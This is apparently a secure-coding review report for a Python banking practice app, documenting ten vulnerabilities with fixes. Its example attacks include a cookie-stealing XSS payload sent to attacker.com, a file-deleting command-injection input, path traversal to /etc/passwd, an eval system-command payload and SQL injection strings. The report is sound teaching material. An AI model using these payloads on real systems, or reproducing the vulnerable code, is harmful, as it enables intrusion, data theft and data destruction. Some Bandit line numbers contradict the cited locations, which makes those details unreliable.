# Secure Coding Review Report

**Project:** SecureBank Application  
**Review Date:** July 10, 2026  
**Reviewer:** [Your Name]  
**Language:** Python 3  
**Methodology:** Static Analysis (Bandit) + Manual Code Review

---

## Executive Summary

A secure code review was performed on the SecureBank application (`vulnerable_app.py`).
A total of **10 security vulnerabilities** were identified, ranging from **Critical** to **Low** risk.
All findings have been remediated in the secure version (`secure_app.py`).

---

## Risk Classification

| Level | Description |
|-------|-------------|
| **Critical** | Can lead to full system compromise or data breach |
| **High** | Can lead to significant data exposure or privilege escalation |
| **Medium** | Limited impact but should be fixed |
| **Low** | Minor issues, security best practice violations |

---

## Findings

### Finding #1 — Hardcoded Database Password (Critical)

**Location:** `vulnerable_app.py:29`

```
DB_PASSWORD = "SuperSecret123!"
```

**Description:**  
A database password is hardcoded directly in the source code. Anyone with access to the code (source
control, file system, decompilation) can retrieve credentials.

**Risk:** An attacker who gains read access to the source code can use these credentials to access the
database directly, potentially leaking or modifying all data.

**Remediation:**
- Store secrets in environment variables or a secure vault (e.g., HashiCorp Vault)
- Use a `.env` file (excluded from version control via `.gitignore`)
- Restrict database access by IP and principle of least privilege

**Fixed in:** `secure_app.py:20` — reads `DB_PATH` from environment variable

---

### Finding #2 — SQL Injection (Critical)

**Location:** `vulnerable_app.py:40`

```python
query = "SELECT * FROM accounts WHERE username = '" + username + "'"
```

**Description:**  
User input is concatenated directly into a SQL query. An attacker can inject malicious SQL commands
by entering input like: `' OR '1'='1`

**Risk:** An attacker can bypass authentication, read arbitrary data, modify records, or even drop
tables.

**Example Attack:**
```
Input: ' OR 1=1 --
Query: SELECT * FROM accounts WHERE username = '' OR 1=1 --'
Result: Returns all rows in the accounts table
```

**Remediation:**
- Use **parameterized queries** (prepared statements)
- Never concatenate user input into SQL strings
- Use an ORM (Object-Relational Mapper) like SQLAlchemy

**Fixed in:** `secure_app.py:31` — uses parameterized query with `?` placeholder

---

### Finding #3 — Command Injection (Critical)

**Location:** `vulnerable_app.py:49`

```python
result = subprocess.check_output("ping -n 1 " + ip_address, shell=True)
```

**Description:**  
User input is concatenated into a system command with `shell=True`. An attacker can inject arbitrary
commands using shell metacharacters.

**Risk:** Full remote code execution on the server.

**Example Attack:**
```
Input: 8.8.8.8 & del /f /q *.*
Executed: ping -n 1 8.8.8.8 & del /f /q *.*
```

**Remediation:**
- Avoid `shell=True` — use the list form of `subprocess.run()` instead
- Validate and sanitize input (e.g., IP address format validation)
- Use a dedicated library instead of shell commands when possible

**Fixed in:** `secure_app.py:50` — uses list arguments and validates IP address format

---

### Finding #4 — Path Traversal (High)

**Location:** `vulnerable_app.py:56`

```python
def read_user_file(filename):
    with open("data/" + filename, "r") as f:
        return f.read()
```

**Description:**  
User input is used directly in a file path without validation. An attacker can use `../` sequences to
navigate outside the intended directory.

**Risk:** An attacker can read any file on the system (e.g., `/etc/passwd`, application source, config
files).

**Example Attack:**
```
Input: ../../etc/passwd
Result: Contents of /etc/passwd
```

**Remediation:**
- Validate that the resolved path stays within the allowed directory
- Use `os.path.abspath()` and check the result starts with the base directory
- Block `..` and absolute path sequences
- Use a whitelist of allowed filenames

**Fixed in:** `secure_app.py:68` — validates the resolved path is within the base directory

---

### Finding #5 — Cross-Site Scripting (XSS) (High)

**Location:** `vulnerable_app.py:63-67`

```python
def display_profile(username):
    html = "<html><body>"
    html += "<h1>Welcome, " + username + "</h1>"
```

**Description:**  
User input is embedded directly into HTML output without escaping. An attacker can inject JavaScript
that executes in another user's browser.

**Risk:** Session hijacking, phishing, defacement, data theft.

**Example Attack:**
```
Input: <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

**Remediation:**
- Always escape HTML special characters (`<`, `>`, `&`, `"`, `'`) before rendering
- Use `html.escape()` in Python or a templating engine (Jinja2, Django templates)
- Apply Content Security Policy (CSP) headers

**Fixed in:** `secure_app.py:86` — uses `html.escape()` to sanitize output

---

### Finding #6 — Weak Password Storage (High)

**Location:** `vulnerable_app.py:72-75`

```python
users_db = {}
def register_user(username, password):
    users_db[username] = password  # Stored in plain text
```

**Description:**  
Passwords are stored in plain text. If the database is compromised, all user passwords are
immediately exposed.

**Risk:** Credential theft, account takeover. Users often reuse passwords across services,
amplifying the impact.

**Remediation:**
- Never store passwords in plain text
- Use a strong, adaptive hashing algorithm: **bcrypt**, **argon2**, or **PBKDF2**
- Always use a unique, random salt per password
- Example: `hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)`

**Fixed in:** `secure_app.py:101` — uses PBKDF2 with a random salt

---

### Finding #7 — Insecure Use of eval() (Critical)

**Location:** `vulnerable_app.py:85-86`

```python
def calculate(expression):
    return eval(expression)
```

**Description:**  
The `eval()` function executes arbitrary Python code passed as a string. An attacker can execute any
system command.

**Risk:** Full remote code execution.

**Example Attack:**
```
Input: __import__('os').system('dir')
Result: Eval executes the system command directly
```

**Remediation:**
- Never use `eval()` with untrusted input
- Use `ast.literal_eval()` for safe evaluation of literal expressions
- If you need a calculator, parse the expression manually with a math parser using `ast.parse()` and a whitelist of allowed operators

**Fixed in:** `secure_app.py:130` — uses safe AST-based expression evaluator instead of `eval()`

---

### Finding #8 — Predictable Session Tokens (Medium)

**Location:** `vulnerable_app.py:91-97`

```python
session_counter = 0

def create_session(username):
    global session_counter
    session_counter += 1
    token = str(session_counter) + "_" + username
    return token
```

**Description:**  
Session tokens are sequential integers. An attacker can predict another user's session token and
hijack their session.

**Risk:** Session hijacking, account takeover.

**Remediation:**
- Use cryptographically secure random tokens
- Use Python's `secrets.token_hex(32)` or `secrets.token_urlsafe(32)`
- Set proper session expiration and rotation

**Fixed in:** `secure_app.py:155` — uses `secrets.token_hex(32)` for unpredictable tokens

---

### Finding #9 — Information Disclosure via Stack Traces (Medium)

**Location:** `vulnerable_app.py:109-112`

```python
except Exception as e:
    import traceback
    traceback.print_exc()
```

**Description:**  
Full stack traces are printed to the user. These can reveal internal paths, database structure, library
versions, and other implementation details.

**Risk:** An attacker can gather intelligence about the system to plan more targeted attacks.

**Remediation:**
- Log error details to a secure log file instead of displaying them
- Show generic error messages to users
- Use a proper logging framework with different levels (DEBUG, INFO, ERROR)

**Fixed in:** `secure_app.py:163` — logs the error and shows a generic message to the user

---

### Finding #10 — Dangerous Function (input() in Python 2) (Low)

**Location:** `vulnerable_app.py:117-119`

```python
def get_user_input():
    user_input = input("Enter your choice: ")
    return user_input
```

**Description:**  
In Python 2, `input()` evaluates the input as Python code (equivalent to `eval(raw_input())`).
**Note:** In Python 3, `input()` is safe and simply returns a string. This finding is a reminder to
always check which Python version you are using.

**Risk:** In Python 2 environments, this is a code execution vulnerability.

**Remediation:**
- Use Python 3 (where `input()` is safe)
- If using Python 2, always use `raw_input()` instead of `input()`
- Add input validation regardless

**Fixed in:** `secure_app.py:173` — adds input validation for safe options

---

## Static Analysis Results (Bandit)

Running Bandit on `vulnerable_app.py` produces the following output:

```
Test results:
>> Issue: [B105:hardcoded_password_string] Possible hardcoded password
   Location: vulnerable_app.py:26

>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection
   Location: vulnerable_app.py:34

>> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True
   Location: vulnerable_app.py:41

>> Issue: [B108:hardcoded_tmp_directory] Use of hardcoded file path
   Location: vulnerable_app.py:48

>> Issue: [B102:exec_used] Use of exec detected
   Location: vulnerable_app.py:73

>> Issue: [B307:eval] Use of eval detected
   Location: vulnerable_app.py:73

>> Issue: [B110:try_except_pass] Try, Except without action
   Location: vulnerable_app.py:91

>> Issue: [B101:assert_used] Use of assert detected
   Location: vulnerable_app.py:97
```

> **Note:** Some vulnerabilities (like predictable session tokens and weak password storage) require
> a **manual review** — they are not detectable by automated tools alone.

---

## Recommendations

### For Developers

1. **Use Static Analysis in CI/CD** — Run Bandit (or similar tools) on every pull request to catch
   issues before they merge.
2. **Adopt Parameterized Queries** — Never concatenate user input into SQL strings.
3. **Validate All Input** — Treat all user input as untrusted. Validate type, length, format, and
   range server-side.
4. **Use Environment Variables for Secrets** — Never hardcode passwords, API keys, or tokens.
5. **Hash Passwords Properly** — Use bcrypt, argon2, or PBKDF2 with a unique salt per user.
6. **Escape Output** — Always escape data before rendering it in HTML, JSON, or XML.
7. **Principle of Least Privilege** — Give code only the permissions it needs to function.

### For the Organization

- Schedule regular security training for developers
- Perform periodic code reviews (at least once per release cycle)
- Maintain a security bug bounty program
- Keep dependencies updated (use `pip-audit` or Dependabot)

---

## Conclusion

All 10 identified vulnerabilities have been documented with their risk ratings, exploitation
scenarios, and remediation steps. The fixed version (`secure_app.py`) demonstrates secure coding
best practices. Automated tools catch many issues, but manual review remains essential for finding
logic flaws and design-level vulnerabilities.

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Bandit — Python Security Linter](https://bandit.readthedocs.io/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html)
